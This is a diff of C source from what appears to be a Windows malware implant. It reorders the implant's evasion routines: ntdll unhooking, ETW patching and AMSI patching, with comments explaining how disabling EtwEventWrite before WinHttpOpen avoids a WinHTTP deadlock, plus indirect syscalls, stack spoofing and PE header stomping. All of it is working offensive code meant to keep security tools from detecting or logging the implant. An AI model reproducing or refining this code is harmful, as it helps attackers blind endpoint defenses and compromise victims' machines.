@@ -546,26 +546,19 @@ BOOL evasion_init_pre_connect(void) {
     PROBE("anti_analysis");
     ELOG("[evasion] anti_analysis OK\r\n");
 
-    /* Stack spoof is safe before WinHTTP — just caches ROP gadgets */
-#if CONFIG_STACK_SPOOF
-    spoof_init();
-    PROBE("stack_spoof");
-    ELOG("[evasion] spoof done\r\n");
-#endif
-
-    ELOG("[evasion] pre-connect OK\r\n");
-    return TRUE;
-}
-
-BOOL evasion_init_post_connect(void) {
-    ELOG("[evasion] post-connect enter\r\n");
-
-    /* Run-time patches — order matters:
-     * 1. Unhook ntdll FIRST (restores clean syscalls for everything else)
-     * 2. Patch ETW (prevent logging of subsequent operations)
-     * 3. Patch AMSI (prevent scanning of loaded assemblies)
-     * 4. Initialize indirect syscalls (after unhook for clean stubs)
-     * 5. Stomp PE headers LAST (after all PE-reading init is done)
+    /* Run-time patches that MUST happen before WinHttpOpen.
+     *
+     * WinHTTP registers ETW providers during WinHttpOpen. If ETW is
+     * functional at that point, WinHTTP sets up provider state that
+     * later calls EtwEventWrite from WinHttpSendRequest. Patching
+     * EtwEventWrite AFTER WinHttpOpen leaves that provider state
+     * dangling → WinHttpSendRequest deadlocks.
+     *
+     * Patching ETW BEFORE WinHttpOpen means WinHTTP sees the neutered
+     * EtwEventWrite during init, never registers providers, and
+     * WinHttpSendRequest skips the ETW path entirely.
+     *
+     * Order: unhook ntdll first (clean stubs), then ETW, then AMSI.
      */
 #if CONFIG_UNHOOK_NTDLL
     evasion_unhook_ntdll();
@@ -585,6 +578,24 @@ BOOL evasion_init_post_connect(void) {
     ELOG("[evasion] amsi done\r\n");
 #endif
 
+    /* Stack spoof is safe before WinHTTP — just caches ROP gadgets */
+#if CONFIG_STACK_SPOOF
+    spoof_init();
+    PROBE("stack_spoof");
+    ELOG("[evasion] spoof done\r\n");
+#endif
+
+    ELOG("[evasion] pre-connect OK\r\n");
+    return TRUE;
+}
+
+BOOL evasion_init_post_connect(void) {
+    ELOG("[evasion] post-connect enter\r\n");
+
+    /* Patches safe AFTER WinHttpOpen:
+     * - Indirect syscalls: resolves SSNs from (now-clean) ntdll
+     * - PE stomp: LAST — after all code that reads PE headers
+     */
 #if CONFIG_INDIRECT_SYSCALLS
     if (syscall_init() != 0) {
         /* Some syscalls failed to resolve — non-fatal, continue */
